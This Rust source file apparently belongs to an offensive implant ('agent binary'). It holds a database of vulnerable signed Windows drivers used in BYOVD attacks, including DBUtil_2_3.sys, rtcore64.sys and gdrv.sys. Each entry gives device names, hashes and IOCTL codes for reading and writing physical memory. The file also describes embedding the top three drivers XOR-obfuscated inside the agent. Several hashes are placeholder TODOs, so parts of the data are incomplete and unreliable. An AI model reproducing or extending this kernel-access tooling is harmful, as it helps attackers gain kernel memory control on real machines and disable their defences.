//! Vulnerable signed driver database for BYOVD operations.
//!
//! Contains a static registry of known vulnerable signed drivers that can be
//! used for physical memory read/write.  Each entry includes the driver name,
//! expected SHA-256 hash for integrity verification, exported function names
//! for physical memory access, and the mapping type.
//!
//! Only the top 3 most-reliable drivers are embedded in the agent binary
//! (XOR-obfuscated at rest).  The remaining entries are kept for reference
//! and for future expansion.

use serde::{Deserialize, Serialize};

/// How a vulnerable driver exposes physical memory access.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DriverMapping {
    /// Direct physical memory read/write via IOCTL.
    PhysicalMemory,
    /// Memory-mapped I/O region.
    MmioMapping,
    /// Port I/O based access.
    PortIo,
}

/// A known vulnerable signed driver entry.
#[derive(Debug, Clone)]
pub struct VulnerableDriver {
    /// Short driver filename, e.g. "DBUtil_2_3.sys".
    pub name: &'static str,
    /// Device name the driver creates (e.g. "DBUtil_2_3", "RTCore64").
    /// Used to construct the NT device path "\\??\\<device_name>" for
    /// opening a handle via NtOpenFile.
    pub device_name: &'static str,
    /// Expected SHA-256 hash for integrity verification.
    pub sha256: &'static str,
    /// Exported function name for physical memory read.
    pub read_phys_fn: &'static str,
    /// Exported function name for physical memory write.
    pub write_phys_fn: &'static str,
    /// How the driver exposes physical memory.
    pub mapping_type: DriverMapping,
    /// IOCTL code for reading physical memory (if applicable).
    pub read_ioctl: u32,
    /// IOCTL code for writing physical memory (if applicable).
    pub write_ioctl: u32,
    /// Whether the driver requires a *physical* address rather than a
    /// virtual one.  DBUtil_2_3.sys passes the address straight to
    /// MmCopyVirtualMemory internally *after* converting it with
    /// MmGetPhysicalAddress, so the caller must supply a physical
    /// address.  Most other drivers (rtcore64, gdrv, procexp152, etc.)
    /// call MmMapIoSpace internally and accept virtual addresses.
    pub needs_physical_addr: bool,
}

/// The static database of known vulnerable signed drivers.
///
/// Ordered by reliability and prevalence:
/// 1. DBUtil_2_3.sys (Dell) — most widely deployed, direct phys mem R/W
/// 2. rtcore64.sys (MSI Afterburner) — gaming PCs, direct phys mem R/W
/// 3. gdrv.sys (Gigabyte) — direct phys mem R/W
/// 4–8. Additional drivers for fallback / future expansion
pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
    // ── Tier 1: Embedded in agent binary ──────────────────────────────

    // DBUtil_2_3.sys — Dell BIOS utility driver (CVE-2021-21551).
    // Requires actual physical addresses because its IOCTL handler calls
    // MmGetPhysicalAddress on the supplied value and then uses
    // MmCopyVirtualMemory on the result.
    VulnerableDriver {
        name: "DBUtil_2_3.sys",
        device_name: "DBUtil_2_3",
        sha256: "0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x222064,
        write_ioctl: 0x222068,
        needs_physical_addr: true,
    },

    // rtcore64.sys — Micro-Star MSI Afterburner / RivaTuner driver.
    // Uses MmMapIoSpace internally, so virtual addresses work fine.
    // TODO: replace placeholder hash with verified SHA-256 from LOLDrivers.
    VulnerableDriver {
        name: "rtcore64.sys",
        device_name: "RTCore64",
        sha256: "TODO_RTCore64_SHA256_VERIFY_AND_REPLACE_0000000000000000000000",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x80002048,
        write_ioctl: 0x8000204C,
        needs_physical_addr: false,
    },

    // gdrv.sys — Giga-BYTE NonPnP Driver (GIO).
    // Uses MmMapIoSpace internally, so virtual addresses work fine.
    VulnerableDriver {
        name: "gdrv.sys",
        device_name: "GIO",
        sha256: "092d04284fdeb6762e65e6ac5b813920d6c69a5e99d110769c5c1a78e11c5ba0",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x9E3AEC18,
        write_ioctl: 0x9E3AEC1C,
        needs_physical_addr: false,
    },

    // ── Tier 2: Reference only (not embedded) ─────────────────────────

    // AsIO.sys — ASUS Low Latency Audio Port I/O driver.
    // Port I/O based — does not use physical memory addressing.
    // TODO: replace placeholder hash with verified SHA-256.
    VulnerableDriver {
        name: "AsIO.sys",
        device_name: "AsIO",
        sha256: "TODO_ASIO_SHA256_VERIFY_AND_REPLACE_0000000000000000000000000000",
        read_phys_fn: "READ_PORT",
        write_phys_fn: "WRITE_PORT",
        mapping_type: DriverMapping::PortIo,
        read_ioctl: 0x222004,
        write_ioctl: 0x222008,
        needs_physical_addr: false,
    },

    // AsIO2.sys — ASUS Low Latency Audio Port I/O driver (v2).
    // Port I/O based — does not use physical memory addressing.
    // TODO: replace placeholder hash with verified SHA-256.
    VulnerableDriver {
        name: "AsIO2.sys",
        device_name: "AsIO2",
        sha256: "TODO_ASIO2_SHA256_VERIFY_AND_REPLACE_000000000000000000000000000",
        read_phys_fn: "READ_PORT",
        write_phys_fn: "WRITE_PORT",
        mapping_type: DriverMapping::PortIo,
        read_ioctl: 0x222004,
        write_ioctl: 0x222008,
        needs_physical_addr: false,
    },

    // BdKit.sys — BitDefender anti-rootkit driver.
    // TODO: replace placeholder hash with verified SHA-256.
    VulnerableDriver {
        name: "BdKit.sys",
        device_name: "BdKit",
        sha256: "TODO_BDKIT_SHA256_VERIFY_AND_REPLACE_0000000000000000000000000000",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x22E024,
        write_ioctl: 0x22E028,
        needs_physical_addr: false,
    },

    // ene.sys — ENE Technology driver.
    // TODO: replace placeholder hash with verified SHA-256.
    VulnerableDriver {
        name: "ene.sys",
        device_name: "ENE",
        sha256: "TODO_ENE_SHA256_VERIFY_AND_REPLACE_00000000000000000000000000000",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x8020E000,
        write_ioctl: 0x8020E004,
        needs_physical_addr: false,
    },

    // procexp152.sys — Process Explorer driver (Sysinternals).
    // Uses MmMapIoSpace + MmGetPhysicalAddress internally.
    // TODO: replace placeholder hash with verified SHA-256.
    VulnerableDriver {
        name: "procexp152.sys",
        device_name: "PROCEXP152",
        sha256: "TODO_PROCEXP152_SHA256_VERIFY_AND_REPLACE_0000000000000000000000",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x6D008,
        write_ioctl: 0x6D00C,
        needs_physical_addr: false,
    },
];

/// Index into DRIVER_DATABASE for the embedded drivers (top 3).
/// These are XOR-obfuscated with the agent's HKDF session key and embedded
/// via `include_bytes!` in the parent module.
pub const EMBEDDED_DRIVER_INDICES: &[usize] = &[0, 1, 2];

/// Find a driver by name (case-insensitive).
pub fn find_driver(name: &str) -> Option<&'static VulnerableDriver> {
    DRIVER_DATABASE
        .iter()
        .find(|d| d.name.eq_ignore_ascii_case(name))
}

/// Return the list of embedded driver entries.
pub fn embedded_drivers() -> Vec<&'static VulnerableDriver> {
    EMBEDDED_DRIVER_INDICES
        .iter()
        .filter_map(|&i| DRIVER_DATABASE.get(i))
        .collect()
}

/// Return all driver names in the database.
pub fn all_driver_names() -> Vec<&'static str> {
    DRIVER_DATABASE.iter().map(|d| d.name).collect()
}
